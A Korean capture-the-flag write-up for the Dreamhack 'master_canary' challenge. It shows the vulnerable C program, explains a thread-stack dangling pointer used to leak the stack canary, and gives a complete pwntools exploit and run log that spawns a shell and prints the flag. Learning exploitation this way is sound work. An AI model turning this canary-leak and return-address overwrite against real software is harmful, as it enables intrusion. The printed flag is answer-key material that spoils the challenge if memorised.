# ✏️ master_canary
https://dreamhack.io/wargame/challenges/58

## 📄 Vulnerability & Code Analysis
주어진 소스 코드는 다음과 같다.
```c
// gcc -o master master.c -pthread
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>

char *global_buffer;

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
    system("/bin/sh");
}

void *thread_routine() {
    char buf[256];

    global_buffer = buf;
}

void read_bytes(char *buf, size_t size) {
    size_t sz = 0;
    size_t idx = 0;
    size_t tmp;

    while (sz < size) {
        tmp = read(0, &buf[idx], 1);
        if (tmp != 1) {
            exit(-1);
        }
        idx += 1;
        sz += 1;
    }
    return;
}

int main(int argc, char *argv[]) {
    size_t size = 0;
    pthread_t thread_t;
    int idx = 0;
    char leave_comment[32];

    initialize();

    while (1) {
        printf("1. Create thread\n");
        printf("2. Input\n");
        printf("3. Exit\n");
        printf("> ");
        scanf("%d", &idx);

        switch (idx) {
            case 1:
                if (pthread_create(&thread_t, NULL, thread_routine, NULL) < 0) {
                    perror("thread create error");
                    exit(0);
                }
                break;
            case 2:
                printf("Size: ");
                scanf("%lu", &size);

                printf("Data: ");
                read_bytes(global_buffer, size);

                printf("Data: %s", global_buffer);
                break;
            case 3:
                printf("Leave comment: ");
                read(0, leave_comment, 1024);
                return 0;
            default:
                printf("Nope\n");
                break;
        }
    }

    return 0;
}

```
보호기법을 확인해보면 Canary가 존재한다.
```bash
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

처음에는 단순히 `leave_comment`에서 발생하는 Stack Buffer Overflow만 이용하면 될 것이라고 생각했다.

```c
char leave_comment[32];

read(0, leave_comment, 1024);
```

`leave_comment`의 크기는 32바이트인데, `read()`로 1024바이트를 입력받기 때문에 return address까지 덮을 수 있다.
또한 PIE가 비활성화되어 있으므로 `get_shell()` 함수 주소는 고정되어 있다.

하지만 보호기법에 Stack Canary가 존재하므로 단순히 return address만 덮으면 `__stack_chk_fail`이 발생한다.
따라서 먼저 Canary 값을 leak한 뒤, overflow payload에 원래 Canary 값을 그대로 넣어주어야 한다.

## 🗡️ Exploit / Solver Strategy
### 1. Thread Stack UAF
Canary leak은 thread_routine()에서 발생하는 dangling pointer를 이용한다.

```c
void *thread_routine() {
    char buf[256];

    global_buffer = buf;
}
```

buf는 thread stack 위에 존재하는 지역 변수이다.
하지만 함수가 종료된 뒤에도 전역 변수 global_buffer는 여전히 buf의 주소를 가리키고 있다.

즉, thread가 종료된 이후에도 global_buffer를 통해 이미 종료된 thread stack 영역에 접근할 수 있다.
```c
read_bytes(global_buffer, size);
printf("Data: %s", global_buffer);
```
case 2에서는 global_buffer에 원하는 크기만큼 입력을 쓸 수 있고, 이후 %s로 출력한다.
이를 이용하면 thread stack 주변에 남아 있는 값을 leak할 수 있다.

### 2. Canary Leak
일반적인 stack canary는 첫 바이트가 \x00이다.
```
00 ?? ?? ?? ?? ?? ?? ??
```
따라서 %s로 출력하면 첫 NULL 바이트에서 문자열 출력이 끊긴다.
이를 우회하기 위해 Canary의 첫 바이트만 임의의 문자로 덮는다.
```python
payload = b"A" * offset
payload += b"B"
```
이렇게 하면 원래 Canary의 첫 바이트 \x00이 B로 바뀌고, 뒤쪽 7바이트가 %s 출력으로 leak된다.
```python
leaked = p.recvn(7)
canary = u64(b"\x00" + leaked)
```
복구할 때는 다시 앞에 \x00을 붙여 원래 Canary 값을 만든다.

처음에는 buf[256] 뒤의 stack canary를 기준으로 0x108 근처를 leak하려고 했다.
하지만 thread가 종료된 뒤 해당 stack frame은 안정적으로 유지되지 않았고, 출력에 메뉴 문자열인 1.이 섞이는 문제가 있었다.

따라서 thread stack에서 TLS 영역의 master canary까지의 offset을 기준으로 leak을 진행했다.
remote 환경에서는 해당 offset을 0x8e8로 맞추어 진행했다.

### 3. Main Stack Overflow
Canary를 leak한 뒤에는 case 3의 leave_comment overflow를 이용한다.

leave_comment부터 Canary까지의 offset은 0x28이다.

payload 구조는 다음과 같다.
```
"A" * 0x28
+ leaked canary
+ saved rbp dummy
+ ret gadget
+ get_shell
```
ret gadget은 stack alignment를 맞추기 위해 넣었다.
`get_shell()` 내부에서 `system("/bin/sh")`가 호출되므로, return address를 `get_shell()`로 덮으면 shell을 얻을 수 있다.

## 💻 Final Payload or Solver
```python
from pwn import *

p = remote("host3.dreamhack.games", 17351)
e = ELF("./master_canary")
rop = ROP(e)

get_shell = e.symbols["get_shell"]
ret = rop.find_gadget(["ret"]).address

payload = b"A" * 0x8e8
payload += b"B"

p.sendlineafter(b"> ", b"1")

p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"Size: ", str(len(payload)).encode())
p.sendafter(b"Data: ", payload)

p.recvuntil(b"Data: ")
p.recvuntil(payload)

leaked = p.recvn(7)
log.info(f"raw leaked: {leaked.hex()}")

canary = u64(b"\x00" + leaked)
log.info(f"Leaked canary: {hex(canary)}")

payload2 = b"A" * 0x28
payload2 += p64(canary)
payload2 += b"C" * 8
payload2 += p64(ret)
payload2 += p64(get_shell)

p.sendlineafter(b"> ", b"3")
p.sendafter(b"Leave comment: ", payload2)

p.interactive()
```

## 🏳️ cat flag
```bash
(.venv) (base) ➜  master_canary pypwn master_canary.py
[↖] Opening connection to host3.dreamhack.games on port 17351: Trying 23[+] Opening connection to host3.dreamhack.games on port 17351: Done
[*] '/home/daniel/dreamhack/pwn/master_canary/master_canary'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] Loaded 14 cached gadgets for './master_canary'
[*] raw leaked: 26ac751b2b90b6
[*] Leaked canary: 0xb6902b1b75ac2600
[*] Switching to interactive mode
$ cat flag
DH{5784e01c14862d84172ca055720f512ec3dd7e3b4421c691f638b1152cd62312}
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to host3.dreamhack.games port 17351
```

